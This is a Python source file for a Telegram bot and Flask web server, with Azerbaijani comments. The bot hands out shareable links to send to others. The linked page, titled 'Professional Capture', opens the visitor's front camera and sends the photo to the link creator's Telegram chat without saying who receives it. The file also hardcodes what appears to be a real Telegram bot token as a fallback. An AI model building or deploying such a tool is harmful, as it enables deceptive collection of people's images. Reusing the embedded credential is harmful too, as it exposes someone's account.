import os
import json
import logging
import base64
import requests
from datetime import datetime
from threading import Thread
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- 1. CONFIG & LOGGING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Təhlükəsizlik: Token və URL mühit dəyişənlərindən alınmalıdır (Fallback olaraq səninkiləri qoydum)
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8069501498:AAExx7_1QkbFWLAkBcWZF7JNMKrpIo0uWCg")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://camera-cjl1.onrender.com")
FLASK_PORT = int(os.environ.get("PORT", 5000))
USERS_FILE = "users.json"

app = Flask(__name__)

# --- 2. DATABASE HELPER ---
def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except json.JSONDecodeError:
            return {}
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

# --- 3. TELEGRAM BOT LOGIC ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    users = load_users()
    
    # Qeydiyyat
    if str(user.id) not in users:
        users[str(user.id)] = {
            'name': user.first_name,
            'joined': datetime.now().isoformat(),
            'photos_received': 0
        }
        save_users(users)
    
    share_link = f"{WEBHOOK_URL}/share?user_id={user.id}"
    
    message = (
        f"👋 Salam {user.first_name}!\n\n"
        f"📱 **Sizin Özəl Linkiniz:**\n{share_link}\n\n"
        f"💡 **Bu linki başqasına göndərin:**\n"
        f"- Onlar linki açsın\n"
        f"- Kamera icazəsi versin\n"
        f"- Şəkil çəksin\n"
        f"- Şəkil sizə gələcək! ✅"
    )
    
    keyboard = [[InlineKeyboardButton("📋 Linki Kopyala", url=share_link)]]
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard))
    logger.info(f"User {user.id} logged in.")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.photo:
        await update.message.reply_text("✅ Şəkil qəbul edildi!")

def run_bot():
    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    bot_app.run_polling()

# --- 4. FLASK WEB SERVER ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Professional Capture</title>
    <style>
        :root { --primary: #667eea; --danger: #ef4444; --success: #10b981; }
        body { font-family: -apple-system, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 2rem; border-radius: 1rem; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        #video, #preview { width: 100%; border-radius: 0.5rem; background: #000; aspect-ratio: 9/16; object-fit: cover; }
        .controls { display: flex; gap: 10px; margin-top: 1rem; }
        button { flex: 1; padding: 12px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.3s; }
        .btn-primary { background: var(--primary); color: white; }
        .btn-danger { background: var(--danger); color: white; }
        .hidden { display: none; }
        .status-msg { margin-top: 10px; font-size: 0.8rem; color: #94a3b8; }
    </style>
</head>
<body>
<div class="card">
    <h2 id="title">Kamera İnterfeysi</h2>
    <video id="video" autoplay playsinline class="hidden"></video>
    <img id="preview" class="hidden">
    
    <div id="controls" class="controls">
        <button id="startBtn" class="btn-primary">Başlat</button>
        <button id="captureBtn" class="btn-primary hidden">Çək</button>
        <button id="retryBtn" class="btn-danger hidden">Yenidən</button>
        <button id="sendBtn" class="btn-primary hidden">Göndər</button>
    </div>
    <div id="status" class="status-msg"></div>
</div>

<script>
    const video = document.getElementById('video');
    const preview = document.getElementById('preview');
    const startBtn = document.getElementById('startBtn');
    const captureBtn = document.getElementById('captureBtn');
    const retryBtn = document.getElementById('retryBtn');
    const sendBtn = document.getElementById('sendBtn');
    const status = document.getElementById('status');
    let stream = null;

    const UI = {
        show: (...els) => els.forEach(el => el.classList.remove('hidden')),
        hide: (...els) => els.forEach(el => el.classList.add('hidden'))
    };

    startBtn.onclick = async () => {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            video.srcObject = stream;
            UI.hide(startBtn);
            UI.show(video, captureBtn);
            status.textContent = "Kamera aktivdir.";
        } catch (e) {
            status.textContent = "Kamera icazəsi tələb olunur!";
        }
    };

    captureBtn.onclick = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        preview.src = canvas.toDataURL('image/jpeg');
        UI.hide(video, captureBtn);
        UI.show(preview, retryBtn, sendBtn);
        status.textContent = "Şəkil çəkildi.";
    };

    retryBtn.onclick = () => {
        UI.hide(preview, retryBtn, sendBtn);
        UI.show(video, captureBtn);
    };

    sendBtn.onclick = async () => {
        status.textContent = "Göndərilir...";
        sendBtn.disabled = true;
        try {
            const response = await fetch('/upload-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: "{{ user_id }}", photo: preview.src })
            });
            const result = await response.json();
            status.textContent = result.success ? "✅ Uğurla göndərildi!" : "❌ Xəta baş verdi.";
            if(result.success) { UI.hide(sendBtn, retryBtn); }
        } catch (err) {
            status.textContent = "❌ Bağlantı xətası.";
            sendBtn.disabled = false;
        }
    };
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return "✅ Telegram Kamera Bot Aktivdir!"

@app.route('/share')
def share():
    user_id = request.args.get('user_id')
    users = load_users()
    
    if not user_id or user_id not in users:
        return "<h1>❌ Xəta: Etibarsız və ya səhv link.</h1>", 400
        
    return render_template_string(HTML_TEMPLATE, user_id=user_id)

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    try:
        data = request.get_json()
        user_id = data.get('user_id')
        photo_base64 = data.get('photo')
        
        if not user_id or not photo_base64:
            return jsonify({'success': False, 'error': 'Parametr yoxdur'}), 400
            
        # JSON-a yazmaq əvəzinə, Base64-ü dərhal oxuyub Telegram-a atırıq. Yaddaş qənaəti!
        photo_bytes = base64.b64decode(photo_base64.split(',')[1])
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
        payload = {'chat_id': user_id, 'caption': f"📸 Yeni Şəkil!\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
        
        response = requests.post(url, files=files, data=payload)
        
        if response.status_code == 200:
            # Uğurlu olarsa, sadəcə sayğacı artır
            users = load_users()
            if user_id in users:
                users[user_id]['photos_received'] = users[user_id].get('photos_received', 0) + 1
                save_users(users)
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Telegram API xətası'}), 500

    except Exception as e:
        logger.error(f"Error processing upload: {e}")
        return jsonify({'success': False, 'error': 'Server xətası'}), 500

# --- 5. MAIN EXECUTION ---
if __name__ == '__main__':
    # Flask-ı fonda başlat
    flask_thread = Thread(target=lambda: app.run(host='0.0.0.0', port=FLASK_PORT, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    
    logger.info("Server və Bot aktiv edildi!")
    
    # Telegram Bot-u ana thread-də başlat
    run_bot()
